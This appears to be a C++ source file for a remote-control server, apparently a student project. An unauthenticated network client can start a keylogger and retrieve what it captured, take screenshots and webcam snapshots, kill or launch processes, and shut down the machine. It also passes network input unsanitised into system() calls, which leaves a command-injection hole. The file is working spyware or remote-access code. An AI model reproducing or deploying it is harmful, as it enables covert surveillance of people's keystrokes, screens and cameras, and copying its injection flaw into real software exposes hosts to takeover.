#include "common.h"
#include <atomic>
#include <mutex>
#include <vector>

#ifdef _WIN32
    #include <gdiplus.h>
    #include <vfw.h>          // Video for Windows - WEBCAM
    #pragma comment(lib, "gdiplus.lib")
    #pragma comment(lib, "vfw32.lib")
#else
    #include <X11/Xlib.h>
    #include <X11/Xutil.h>
#endif

using namespace std;

class RemoteServer {
private:
    SOCKET_TYPE serverSocket;
    SOCKET_TYPE clientSocket;
    std::atomic<bool> keyloggerActive;
    std::string keylogBuffer;
    std::mutex keylogMutex;
    std::thread keylogThread;
    
    // Webcam state
    std::atomic<bool> webcamActive;
    
public:
    RemoteServer() : serverSocket(INVALID_SOCKET_VALUE), 
                     clientSocket(INVALID_SOCKET_VALUE),
                     keyloggerActive(false),
                     webcamActive(false) {
        initWinsock();
    }
    
    ~RemoteServer() {
        stop();
        cleanupWinsock();
    }
    
    bool start() {
        // Create socket
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET_VALUE) {
            cerr << "Failed to create socket" << endl;
            return false;
        }
        
        // Allow reuse of address
        int opt = 1;
        if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, 
                      (char*)&opt, sizeof(opt)) < 0) {
            cerr << "Setsockopt failed" << endl;
            return false;
        }
        
        // Bind socket
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(PORT);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, 
                sizeof(serverAddr)) < 0) {
            cerr << "Bind failed" << endl;
            return false;
        }
        
        // Listen for connections
        if (listen(serverSocket, MAX_CLIENTS) < 0) {
            cerr << "Listen failed" << endl;
            return false;
        }
        
        cout << "Server started on port " << PORT << endl;
        cout << "Waiting for client connections..." << endl;
        
        return true;
    }
    
    void run() {
        while (true) {
            sockaddr_in clientAddr;
            socklen_t clientLen = sizeof(clientAddr);
            
            cout << "Waiting for accept..." << endl;
            SOCKET_TYPE newSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientLen);
            
            if (newSocket == INVALID_SOCKET_VALUE) {
                cerr << "Accept failed" << endl;
                continue;
            }
            
            clientSocket = newSocket;
            cout << "Client connected from " << inet_ntoa(clientAddr.sin_addr) << endl;
            
            handleClient();
            
            if (clientSocket != INVALID_SOCKET_VALUE) {
                closesocket(clientSocket);
                clientSocket = INVALID_SOCKET_VALUE;
            }
            cout << "Client disconnected" << endl;
        }
    }
    
    void handleClient() {
        Packet packet;
        
        // Loop receive command
        while (receivePacket(clientSocket, packet)) {
            cout << "Received command: " << packet.command << endl;
            
            switch (packet.command) {
                case CMD_LIST_APPS:
                    handleListApps();
                    break;
                case CMD_STOP_APP:
                    handleStopApp(packet.data);
                    break;
                case CMD_START_APP:
                    handleStartApp(packet.data);
                    break;
                case CMD_LIST_PROCESS:
                    handleListProcesses();
                    break;
                case CMD_KILL_PROCESS:
                    handleKillProcess(atoi(packet.data));
                    break;
                case CMD_SCREENSHOT:
                    handleScreenshot();
                    break;
                case CMD_KEYLOG_START:
                    startKeylogger();
                    break;
                case CMD_KEYLOG_STOP:
                    stopKeylogger();
                    break;
                case CMD_KEYLOG_GET:
                    getKeylogData();
                    break;
                case CMD_WEBCAM_ON:
                    handleWebcamOn();
                    break;
                case CMD_WEBCAM_OFF:
                    handleWebcamOff();
                    break;
                case CMD_WEBCAM_CAPTURE:
                    handleWebcamCapture(packet.data);
                    break;
                case CMD_SHUTDOWN:
                    handleShutdown();
                    break;
                case CMD_RESTART:
                    handleRestart();
                    break;
                case CMD_EXIT:
                    return; // Break loop to disconnect
                default:
                    cout << "Unknown command: " << packet.command << endl;
                    break;
            }
        }
    }

    // --- Helper to send text response safely ---
    void sendTextResponse(int command, const string& text) {
        Packet response;
        response.command = command;
        // Truncate if too long to avoid overflow
        size_t len = text.length();
        if (len >= BUFFER_SIZE) len = BUFFER_SIZE - 1;
        
        strncpy(response.data, text.c_str(), len);
        response.data[len] = '\0';
        response.dataSize = (int)len;
        
        sendPacket(clientSocket, response);
    }
    
    // Function 1: List running applications
    void handleListApps() {
        string appList = "";
#ifdef _WIN32
        HWND hwnd = GetTopWindow(NULL);
        while (hwnd) {
            if (IsWindowVisible(hwnd)) {
                char windowTitle[256];
                GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
                if (strlen(windowTitle) > 0) {
                    appList += windowTitle;
                    appList += "\n";
                }
            }
            hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
        }
#else
        FILE* pipe = popen("ps aux | grep -v grep | awk '{print $11}'", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) appList += buffer;
            pclose(pipe);
        }
#endif
        sendTextResponse(CMD_LIST_APPS, appList);
    }
    
    // Function 2: Stop an application
    void handleStopApp(const char* appName) {
        string result;
#ifdef _WIN32
        string cmd = "taskkill /F /IM \"" + string(appName) + ".exe\"";
#else
        string cmd = "pkill -f \"" + string(appName) + "\"";
#endif
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application stopped" : "Failed to stop application";
        sendTextResponse(CMD_STOP_APP, result);
    }
    
    // Function 3: Start an application
    void handleStartApp(const char* appPath) {
        string result;
#ifdef _WIN32
        // Use standard system call for simplicity
        string cmd = "start \"\" \"" + string(appPath) + "\"";
#else
        string cmd = string(appPath) + " &";
#endif
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application started" : "Failed to start";
        sendTextResponse(CMD_START_APP, result);
    }
    
    // Function 4: List processes
    void handleListProcesses() {
        string processList = "";
#ifdef _WIN32
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        
        if (hProcessSnap != INVALID_HANDLE_VALUE) {
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hProcessSnap, &pe32)) {
                do {
                    processList += "PID: " + to_string(pe32.th32ProcessID);
                    processList += " | " + string(pe32.szExeFile) + "\n";
                } while (Process32Next(hProcessSnap, &pe32));
            }
            CloseHandle(hProcessSnap);
        } else {
            processList = "Failed to snapshot processes.";
        }
#else
        FILE* pipe = popen("ps -e -o pid,comm", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) processList += buffer;
            pclose(pipe);
        }
#endif
        sendTextResponse(CMD_LIST_PROCESS, processList);
    }
    
    // Function 5: Kill a process
    void handleKillProcess(int pid) {
        string result;
#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess != NULL) {
            if (TerminateProcess(hProcess, 0)) result = "Process killed";
            else result = "Failed to kill process";
            CloseHandle(hProcess);
        } else result = "Cannot open process";
#else
        if (kill(pid, SIGKILL) == 0) result = "Process killed";
        else result = "Failed to kill process";
#endif
        sendTextResponse(CMD_KILL_PROCESS, result);
    }
    
    // Function 6: Screenshot (FIXED: Using sendLargeFile)
    void handleScreenshot() {
        string filename = "screenshot_temp.bmp";
        bool captured = false;

#ifdef _WIN32
        // GDI Screenshot
        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        int width = GetDeviceCaps(hScreenDC, HORZRES);
        int height = GetDeviceCaps(hScreenDC, VERTRES);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
        
        // Save to file
        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        
        DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
        bmfHeader.bfType = 0x4D42; // 'BM'
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        char* lpbitmap = new char[dwBmpSize];
        GetDIBits(hScreenDC, hBitmap, 0, height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        ofstream file(filename, ios::binary);
        if (file.is_open()) {
            file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
            file.write((char*)&bi, sizeof(BITMAPINFOHEADER));
            file.write(lpbitmap, dwBmpSize);
            file.close();
            captured = true;
        }
        
        delete[] lpbitmap;
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        DeleteObject(hBitmap);
#else
        // Linux Screenshot (ImageMagick)
        filename = "screenshot_temp.png";
        string cmd = "import -window root " + filename;
        if (system(cmd.c_str()) == 0) captured = true;
#endif

        if (captured) {
            // QUAN TRỌNG: Dùng sendLargeFile để gửi file lớn
            if (!sendLargeFile(clientSocket, CMD_SCREENSHOT, filename)) {
                cerr << "Failed to send screenshot file" << endl;
            }
            remove(filename.c_str()); // Xóa file tạm
        } else {
            sendTextResponse(CMD_SCREENSHOT, "Failed to capture screenshot");
        }
    }
    
    // Function 7-9: Keylogger
    void startKeylogger() {
        if (!keyloggerActive) {
            keyloggerActive = true;
            keylogThread = std::thread(&RemoteServer::keyloggerLoop, this);
            sendTextResponse(CMD_KEYLOG_START, "Keylogger started");
        } else {
            sendTextResponse(CMD_KEYLOG_START, "Keylogger already running");
        }
    }
    
    void stopKeylogger() {
        if (keyloggerActive) {
            keyloggerActive = false;
            if (keylogThread.joinable()) keylogThread.join();
            sendTextResponse(CMD_KEYLOG_STOP, "Keylogger stopped");
        } else {
             sendTextResponse(CMD_KEYLOG_STOP, "Keylogger not running");
        }
    }
    
    void getKeylogData() {
        std::lock_guard<std::mutex> lock(keylogMutex);
        sendTextResponse(CMD_KEYLOG_GET, keylogBuffer.empty() ? "[Empty]" : keylogBuffer);
        keylogBuffer.clear();
    }
    
    void keyloggerLoop() {
#ifdef _WIN32
        while (keyloggerActive) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) == -32767) { // Key pressed
                    std::lock_guard<std::mutex> lock(keylogMutex);
                    if (key == VK_RETURN) keylogBuffer += "\n";
                    else if (key == VK_SPACE) keylogBuffer += " ";
                    else if (key == VK_BACK) keylogBuffer += "[BKSP]";
                    else if (key >= 32 && key <= 126) keylogBuffer += (char)key;
                    else keylogBuffer += "[" + to_string(key) + "]";
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
#endif
    }
    
    // Function 10-11: Webcam Control
    void handleWebcamOn() {
        webcamActive = true;
        sendTextResponse(CMD_WEBCAM_ON, "Webcam logic active");
    }
    
    void handleWebcamOff() {
        webcamActive = false;
        sendTextResponse(CMD_WEBCAM_OFF, "Webcam logic inactive");
    }
    
    // Function 14: Webcam Capture (FIXED: Using sendLargeFile)
    void handleWebcamCapture(const char* data) {
        string filename = "webcam_snap.bmp";
        bool success = false;
        
#ifdef _WIN32
        HWND hWndCap = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, GetDesktopWindow(), 0);
        if (hWndCap) {
            if (capDriverConnect(hWndCap, 0)) {
                capGrabFrame(hWndCap);
                capFileSaveDIB(hWndCap, filename.c_str());
                capDriverDisconnect(hWndCap);
                success = true;
            }
            DestroyWindow(hWndCap);
        }
#endif
        // Linux logic similar to screenshot...

        if (success) {
            // QUAN TRỌNG: Dùng sendLargeFile
            if (!sendLargeFile(clientSocket, CMD_WEBCAM_CAPTURE, filename)) {
                 cerr << "Failed to send webcam image" << endl;
            }
            remove(filename.c_str());
        } else {
            sendTextResponse(CMD_WEBCAM_CAPTURE, "Failed to capture webcam");
        }
    }
    
    // Function 12-13: Power
    void handleShutdown() {
        sendTextResponse(CMD_SHUTDOWN, "Shutting down...");
#ifdef _WIN32
        system("shutdown /s /t 5");
#else
        system("shutdown -h now");
#endif
    }
    
    void handleRestart() {
        sendTextResponse(CMD_RESTART, "Restarting...");
#ifdef _WIN32
        system("shutdown /r /t 5");
#else
        system("reboot");
#endif
    }
    
    void stop() {
        keyloggerActive = false;
        if (keylogThread.joinable()) keylogThread.join();
        if (clientSocket != INVALID_SOCKET_VALUE) closesocket(clientSocket);
        if (serverSocket != INVALID_SOCKET_VALUE) closesocket(serverSocket);
    }
};

int main() {
    RemoteServer server;
    if (!server.start()) return 1;
    server.run();
    return 0;
}